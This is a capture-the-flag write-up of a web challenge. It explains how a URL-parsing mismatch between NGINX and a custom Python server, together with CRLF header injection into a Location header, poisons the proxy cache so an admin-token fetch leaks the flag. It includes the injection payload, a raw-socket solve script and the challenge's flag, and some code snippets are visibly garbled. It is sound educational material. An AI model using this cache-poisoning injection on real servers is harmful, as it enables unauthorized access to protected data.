# Sideral Noise - Writeup

## Meta

- **Category:** Web
- **Difficulty:** Medium
- **Number of solves:** 8

### Challenge description

> J'ai enfin fini mon projet de stage à Astra, *Sideral Noise* ! Il permet d'obtenir du bruit à partir d'un de nos satellites, pour une entropie maximale 🤩  
> Cependant, le serveur web à bord du satellite est assez special et j'espère ne pas avoir créé de failles de sécurité avec mon projet...
Le flag est au format `404CTF{[a-f0-9]{16}}`.

## Challenge overview

### First impressions

The challenge is in appearance a *very* simple single-page web application which allows us to retrieve noise in the form of a string of 512 hex characters.

### Technical overview

The challenge is composed of three components :
* A **flask** server, which is the frontend of the challenge
* A custom webserver written in python, **the satellite**, which provides the noise
* A **NGINX** reverse proxy, which sits in front of the previous servers and **seems to cache the noise outputs from the satellite**.

### Security measures

* The python dependencies are up-to-date both for the flask server and the satellite server, and do not present any known vulnerabilities.
* The NGINX reverse proxy configuration doesn't present any obvious security issues, and only the requests with a target matching a strict regex (`^/satellite/noise/[A-Za-z0-9_-]{21}$`) are cached.
* The flask and satellite servers are somewhat isolated : the flask server fetches the noise by making a request containing an admin token to the satellite server with `python requests`. There is not much to be done with the satellite without an admin token.

```python
def fetch_noise(noise_id):
    # fetch noise from the satellite
    s = requests.Session()
    s.cookies.set('token', SATELLITE_TOKEN, domain=CHALLENGE_HOST)
    response = s.get(f'http://{CHALLENGE_HOST}/satellite/noise/{noise_id}')
    return response.text
```
* The flag is displayed on the satellite index page (`/satellite`) if the request includes the admin token

```python
def index(request):
    body = ""
    if 'error' in request.query_string:
        error_message = request.query_string['error'][0]
        body += f"<b>Error: {error_message}<b>"
    if is_authenticated(request):
        body += "<h1>Welcome, Administrator</h1>"
        body += f"<p>Here is the flag: {environ.get('FLAG', '404CTF{fake_flag}')}</p>"
        return Response(200, body)
    else:
        body += "<h1>Forbidden</h1>"
        body += "<p>You are not authorized to view this page.</p>"
        return Response(403, body)
```

## Exploitation

### A difficult start

This seems to be a server-side web challenge : there is no bot or administrator to attack here. The closest thing to that would be the noise fetching functionality, which uses `python requests`, but `python requests` only performs HTTP requests and doesn't render anything.  
Taking a look a the frontend source code, the only leeway we have is to specify a noise ID, which is a 21-character *nanoid* - and this id is validated pretty strictly by the flask server before querying the satellite server.

```python
@app.route('/noise', methods=['POST'])
def noise():
    content = request.json
    noise_id = content['noise_id'] if match(r'^[A-Za-z0-9_-]{21}$', content.get('noise_id','')) elseand doesn't use any framework. However, it is not accessible directly, and the only way to interact with it is through the flask server. generate()
    noise = fetch_noise(noise_id)
    return jsonify({'noise': noise})
```

This prevents us from using the noise ID to manipulate the URL requested to the satellite server. Furthermore, the admin cookie is set correctly and wouldn't be transmitted to a host other than the challenge host.  

The satellite server could be a promising target, since it is written "from scratch" with minimal dependencies, which opens the door to many potential vulnerabilities. However, it is quite simple : it parses the requests (only GET requests), tries to match a route (with a regex), executes the associated handler function to generate a response, and returns it. If no routes are matched, it uses a fallback ("not found") handler.

The only declared routes are :
* the index page (`^/satellite/?$`), which displays the flag if the request contains the admin token
* the noise route (`^/satellite/noise/[A-Za-z0-9_-]{21}$`), which returns a random noise string of 512 hex characters

The fallback handler redirects to the index page with an error message containing the requested URL as a query parameter, using a `301` status code and a `Location` header.

This feature is **pretty interesting** for us since by default, `python requests` **follows redirects**, which means if we maange to redirect to the index page, its content including the flag will be returned as noise

That's a starting point!

### URL parsing is hard, don't try this at home

So we want the frontend request to be redirected to the index page. Good news, that's already what the fallback handler does! We just need to somehow make the server handle the frontend noise request with the fallback handler..  
But the request target of the noise request is perfectly valid, so how would it be possible?

There is still a component we haven't looked at yet : the NGINX reverse proxy. It is configured to cache the noise responses, if the request target matches the regex (`^/satellite/noise/[A-Za-z0-9_-]{21}$`). Let's take a look at the caching directives more closely :

```nginx
location ~ "^/satellite/noise/[A-Za-z0-9_-]{21}$" {
    proxy_cache my_cache;
    proxy_cache_key $scheme$proxy_host$uri;
    # cache noise for 5 minutes for traceability
    proxy_cache_valid 200 5m;
    proxy_pass http://${SATELLITE_HOST}:${SATELLITE_PORT};
    proxy_set_header Host $http_host;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_http_version 1.1;
}
```

By default, NGINX uses a hash of `$scheme$proxy_host$request_uri;` (see [this](https://blog.nginx.org/blog/nginx-caching-guide)) as the cache key. But here, this is overridden by the `proxy_cache_key` directive, which uses `$scheme$proxy_host$uri`. What's the difference? The `request_uri` variable is the original URI, while the `$uri` variable is the request URI **after normalization**, which includes query string stripping, path normalization, url decoding, and so on. So many operations that the satellite server does not perform when matching the routes - which means plenty of opportunities of URL parsing discrepancies!

```python
def parse(self, raw_data):
    try:
        lines = raw_data.split('\r\n')
        request_line = lines[0].split()
        self.method, request_target = request_line[0], unquote(request_line[1])
        self.path = request_target.split('?')[0]
        self.query_string = parse_qs(request_target.split('?'[1]) if '?' in request_target else {}
```


So we're looking for a URI that will match the NGINX caching regex, but will not match the satellite server's noise route regex. The satellite handles query strings seemingly correctly - everything after a potential `?` is given to `parse_qs`. But what if there isn't any `?` but the URI still contains an additional component after the path, like a fragment? A [fragment](https://en.wikipedia.org/wiki/URI_fragment) begins with a `#` and should not be sent to the server, but many web servers (like NGINX!) handle it ! It means that a URI like `/satellite/noise/V1StGXR8_Z5jdHi6B-myT#test` **will be cached by NGINX** (and with the same cache key as `/satellite/noise/V1StGXR8_Z5jdHi6B-myT`!), but **the satellite server noise route will not be matched, which means it will result in a error redirect to the index!**

It seems that we have a pretty solid plan here, but there is one (major) problem : the NGINX directive `proxy_cache_valid 200 5m;` means that only responses with a 200 status code will be cached, and so our 301 redirect won't :\(  
If only there was a way to force NGINX to cache the response, even if it is doesn't have a 200 status code...  

### Time to RTFM

Let's dig into the [NGINX documentation](https://nginx.org/en/docs/http/ngx_http_proxy_module.html) to get a clearer understanding of the caching directives : 

> Parameters of caching can also be set directly in the response header. This has higher priority than setting of caching time using the directive.
> * The “X-Accel-Expires” header field sets caching time of a response in seconds. The zero value disables caching for a response. If the value starts with the @ prefix, it sets an absolute time in seconds since Epoch, up to which the response may be cached. 
> * If the header does not include the “X-Accel-Expires” field, parameters of caching may be set in the header fields “Expires” or “Cache-Control”.
> * If the header includes the “Set-Cookie” field, such a response will not be cached.
> * If the header includes the “Vary” field with the special value “*”, such a response will not be cached (1.7.7). If the header includes the “Vary” field with another value, such a response will be cached taking into account the corresponding request header fields (1.7.7).

Very interesting! It seems that if can control the response headers sent by the satellite server, we could force NGINX to cache the response, even if it is a 301 redirect! But is it even possible? 

### Header injection

So now we're looking for some user-controlled input inserted in a header - and there is one! The URL of the "not found" resource is included in the `Location` header of the server response by the fallback handler!

Let's dig into this potential header injection vulnerability. The `Location` header is set as follows :

```python
response.set_header('Location', '/satellite?error=' + quote('The following resource was not found: ') + request.path)
```

The first part of the message is url-encoded, but what about `request.path`? Let's take a look at the `Request` class :

```python
def parse(self, raw_data):
    try:
        lines = raw_data.split('\r\n')
        request_line = lines[0].split()
        self.method, request_target = request_line[0], unquote(request_line[1])
        self.path = request_target.split('?')[0]
        self.query_string = parse_qs(request_target.split('?')[1]) if '?' in request_target else {}
```

`urllib`'s `unquote` function is used to url-decode `request.target` ! While it may seem a logical choice, it means that `request.target` (and consequently `request.path`) can contain any character, including `\r` (carriage return / CR) and `\n` (line feed / LF). Those two have a special meaning in HTTP messages since `\r\n` is used to delimit lines. Since `request.path` is not sanitized before being used in the `Location` header, we can inject a new line and a new header - for example, a `Cache-Control` header with a `max-age` of 2 minutes, which will be interpreted by NGINX as a caching directive!


### Recap

1. We request `/satellite/noise/V1StGXR8_Z5jdHi6B-myT#%0d%0aCache-Control:%20max-age=120` to the flask server, which will be match the caching regex of NGINX
2. NGINX will forward the request to the satellite server, which will return a 301 redirect with our injected `Cache-Control` header :
```
HTTP/1.1 301 Moved Permanently
Date: Sat, 31 May 2025 22:12:15 GMT
Content-Type: text/html
Content-Length: 18
Connection: close
Location: /satellite?error=The%20following%20resource%20was%20not%20found%3A%20/satellite/noise/V1StGXR8_Z5jdHi6B-myT#
Cache-Control: max-age=120
Strict-Transport-Security: max-age=31536000; includeSubDomains

<h1>Not found</h1>
```
3. NGINX will see the header and cache the response for 2 minutes, even if it is a 301 redirect
4. Since the cache key is the same for for `/satellite/noise/V1StGXR8_Z5jdHi6B-myT#%0d%0aCache-Control:%20max-age=120` and `/satellite/noise/V1StGXR8_Z5jdHi6B-myT`, when we ask the frontend to fetch some noise and we provide the noise ID `V1StGXR8_Z5jdHi6B-myT`, NGINX will serve it the cached response (the same as above!) which will redirect to the index page with the error message, which will include the flag!

```json
{"noise":"<b>Error: The following resource was not found: /satellite/noise/C7Z0LvqjRg6zuOnr6ETxy<b><h1>Welcome, Administrator</h1><p>Here is the flag: 404CTF{e741f98d7f452aba}</p>"}
```

## Example solve script

```python
import requests
import socket
import ssl
from nanoid import generate

CHALLENGE_HOST = "sideralnoise.404ctf.fr"
PORT = 443

noise_id = generate()
print("Generated noise_id:", noise_id)

raw_request = (
    f"GET /satellite/noise/{noise_id}#%0d%0aCache-Control:%20max-age=120 HTTP/1.1\r\n"
    f"Host: {CHALLENGE_HOST}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
)

context = ssl.create_default_context()
with socket.create_connection((CHALLENGE_HOST, PORT)) as sock:
    with context.wrap_socket(sock, server_hostname=CHALLENGE_HOST) as ssock:
        ssock.sendall(raw_request.encode())
        response = b""
        while True:
            data = ssock.recv(4096)
            if not data:
                break
            response += data

print(response.decode(errors='replace'))

r = requests.post(f'https://{CHALLENGE_HOST}/noise', json={"noise_id": noise_id})
print(r.text)
```

## Flag 

`404CTF{e741f98d7f452aba}`